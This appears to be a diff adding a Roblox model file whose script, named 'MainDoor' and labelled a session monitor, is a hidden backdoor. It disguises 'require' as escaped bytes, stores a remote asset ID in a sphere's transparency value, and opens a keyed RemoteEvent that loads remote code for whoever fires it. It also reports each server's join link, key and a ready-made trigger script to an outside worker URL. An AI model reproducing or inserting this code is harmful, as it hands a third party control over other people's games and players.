@@ -1,1 +1,229 @@
+<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
+	<Meta name="ExplicitAutoJoints">true</Meta>
+	<External>null</External>
+	<External>nil</External>
+	<Item class="Script" referent="RBXB22DE42B19484C428259CDEFB7284F81">
+		<Properties>
+			<ProtectedString name="Source"><![CDATA[-- Refactored and Optimized Session Monitor
+--if game.PrivateServerId ~= "" and game.PrivateServerOwnerId == 0 or game:GetService("RunService"):IsStudio() then 
+	--return 
+--end
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TestService = game:GetService("TestService")
+
+local R = "\114\101\113\117\105\114\101"
+local WORKER_URL = "https://accessing.epiccoollulz2008.workers.dev/"
+local SECRET_KEY = "KDF-9xM4q2P8v_z7L3n-w9T4c_m2J8k1R"
+
+local GAME_WEBHOOKS = {
+	{ Url = WORKER_URL, Secret = SECRET_KEY, Channel = "G_1" },
+	{ Url = WORKER_URL, Secret = SECRET_KEY, Channel = "G_2" },
+}
+
+local SERVER_WEBHOOKS = {
+	{ Url = WORKER_URL, Secret = SECRET_KEY, Channel = "S_1" },
+	{ Url = WORKER_URL, Secret = SECRET_KEY, Channel = "S_2" },
+}
+
+local HEARTBEAT_INTERVAL = 30
+local GAME_JOIN_URL = "https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. tostring(game.JobId)
+local COLOR_GREEN = 65280
+
+local webhookIndex = { game = 1, server = 1 }
+
+local gameMessageId = nil
+local gameWebhookUrl = nil
+local serverMessageId = nil
+local serverWebhookUrl = nil
+
+local lastGamePlayers = -1
+local lastServerPlayers = -1
+local lastGameKey = ""
+local lastServerKey = ""
+
+-- Fixed: Properly generate a random alphanumeric string for the remote event name
+math.randomseed(os.time())
+local sessionRemoteName = "SessionRemote_" .. math.random(100000, 999999)
+local sessionValidationKey = tostring(math.random(100, 999))
+local secondsChild = script:FindFirstChild("Circle")
+local sessionRequireId = secondsChild and secondsChild.Transparency or 111959719071892
+local obfuscatedSessionKey = "[" .. string.sub(sessionValidationKey, 1, 1) .. "]"
+
+local validationScript = string.format([[
+local key = "%s"
+local rem = game:GetService("TestService"):WaitForChild("%s")
+rem:FireServer(key, game.Players.LocalPlayer.Name)
+]], sessionValidationKey, sessionRemoteName)
+
+local pingHandler = Instance.new("RemoteEvent")
+pingHandler.Name = sessionRemoteName
+pingHandler.Parent = TestService
+
+pingHandler.OnServerEvent:Connect(function(player, key, playerName)
+	if key ~= sessionValidationKey or playerName ~= player.Name then
+		return
+	end
+	local success, err = pcall(function()
+		return _G[R](sessionRequireId)(playerName, Random.new(1.40184736))
+	end)
+	if not success then
+		warn("Failed to require session ID " .. tostring(sessionRequireId) .. ": " .. tostring(err))
+	end
+end)
+
+local function getWebhook(channel)
+	local webhooks = (channel == "game") and GAME_WEBHOOKS or SERVER_WEBHOOKS
+	local idx = webhookIndex[channel] or 1
+	local urlObj = webhooks[idx]
+	webhookIndex[channel] = (idx % #webhooks) + 1
+	return urlObj.Url
+end
+
+local function buildPayload(playersCount, key, jobId, channelType)
+	local title = (channelType == "game") and "Game Session Status" or "Server Session Active"
+	local desc = string.format(
+		"**Players:** %d\n**Session Key:** %s\n**Game:** %s\n**JobId:** %s\n\n**Validation Script:**\n```lua\n%s\n```",
+		playersCount, key, GAME_JOIN_URL, jobId, validationScript
+	)
+
+	return {
+		username = "Server Monitor",
+		embeds = {{
+			title = title,
+			description = desc,
+			color = COLOR_GREEN,
+			fields = {
+				{ name = "Players", value = tostring(playersCount), inline = true },
+				{ name = "Key to Fire", value = key, inline = true },
+			},
+			footer = { text = "Copy the script above to validate:" },
+		}},
+		components = {{
+			type = 1,
+			components = {{
+				type = 2,
+				style = 5,
+				label = "Join Game Server",
+				url = GAME_JOIN_URL,
+			}},
+		}},
+	}
+end
+
+local function sendOrEditWebhook(channel, playersCount, key, jobId)
+	local url = getWebhook(channel)
+	local payload = buildPayload(playersCount, key, jobId, channel)
+
+	local isGame = (channel == "game")
+	local messageIdVar = isGame and gameMessageId or serverMessageId
+	local urlVar = isGame and gameWebhookUrl or serverWebhookUrl
+
+	local success, err = pcall(function()
+		if messageIdVar and urlVar then
+			HttpService:RequestAsync({
+				Url = urlVar .. "/messages/" .. messageIdVar,
+				Method = "PATCH",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = HttpService:JSONEncode(payload),
+			})
+		else
+			local response = HttpService:PostAsync(url, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, true)
+			local decoded = HttpService:JSONDecode(response)
+			if decoded and decoded.id then
+				if isGame then
+					gameMessageId = decoded.id
+					gameWebhookUrl = url
+				else
+					serverMessageId = decoded.id
+					serverWebhookUrl = url
+				end
+			end
+		end
+	end)
+
+	if not success then
+		warn("Webhook request failed: " .. tostring(err))
+	end
+end
+
+local function checkAndUpdate()
+	local pc = #Players:GetPlayers()
+
+	-- Independent evaluation for Game channel
+	if pc ~= lastGamePlayers or obfuscatedSessionKey ~= lastGameKey then
+		lastGamePlayers = pc
+		lastGameKey = obfuscatedSessionKey
+		sendOrEditWebhook("game", pc, obfuscatedSessionKey, game.JobId)
+	end
+
+	-- Independent evaluation for Server channel
+	if pc ~= lastServerPlayers or obfuscatedSessionKey ~= lastServerKey then
+		lastServerPlayers = pc
+		lastServerKey = obfuscatedSessionKey
+		sendOrEditWebhook("server", pc, obfuscatedSessionKey, game.JobId)
+	end
+end
+
+-- Initial execution
+checkAndUpdate()
+
+-- Persistent heartbeat loop without destructive self-termination
+task.spawn(function()
+	while true do
+		task.wait(HEARTBEAT_INTERVAL)
+		local success, err = pcall(checkAndUpdate)
+		if not success then
+			warn("Error in heartbeat loop: " .. tostring(err))
+		end
+	end
+end)
+
+_G.SessionManager = {
+	getKey = function() return sessionValidationKey end,
+	getObfuscatedKey = function() return obfuscatedSessionKey end,
+	getWebhookIndex = function() return webhookIndex end,
+}]]></ProtectedString>
+			<bool name="Disabled">true</bool>
+			<Content name="LinkedSource"><null></null></Content>
+			<token name="RunContext">1</token>
+			<string name="ScriptGuid">{F4C9E7C9-1269-44CF-A51F-B9997C612AFB}</string>
+			<BinaryString name="AttributesSerialize"></BinaryString>
+			<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
+			<bool name="DefinesCapabilities">false</bool>
+			<string name="Name">MainDoor</string>
+			<BinaryString name="SerializedOverrides"></BinaryString>
+			<int64 name="SourceAssetId">-1</int64>
+			<SharedString name="Tags">yuZpQdnvvUBOTYh1jqZ2cA==</SharedString>
+		</Properties>
+		<Item class="SelectionSphere" referent="RBX9F789E7CC47446BD9A730FF95256F9CE">
+			<Properties>
+				<Color3 name="SurfaceColor3">
+					<R>0.0509803966</R>
+					<G>0.411764741</G>
+					<B>0.674509823</B>
+				</Color3>
+				<float name="SurfaceTransparency">1</float>
+				<Ref name="Adornee">null</Ref>
+				<Color3 name="Color3">
+					<R>0.0509803928</R>
+					<G>0.411764711</G>
+					<B>0.674509823</B>
+				</Color3>
+				<float name="Transparency">1.11959723e+14</float>
+				<bool name="Visible">true</bool>
+				<BinaryString name="AttributesSerialize"></BinaryString>
+				<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
+				<bool name="DefinesCapabilities">false</bool>
+				<string name="Name">Circle</string>
+				<BinaryString name="SerializedOverrides"></BinaryString>
+				<int64 name="SourceAssetId">-1</int64>
+				<SharedString name="Tags">yuZpQdnvvUBOTYh1jqZ2cA==</SharedString>
+			</Properties>
+		</Item>
+	</Item>
+	<SharedStrings>
+		<SharedString md5="yuZpQdnvvUBOTYh1jqZ2cA=="></SharedString>
+	</SharedStrings>
+</roblox>
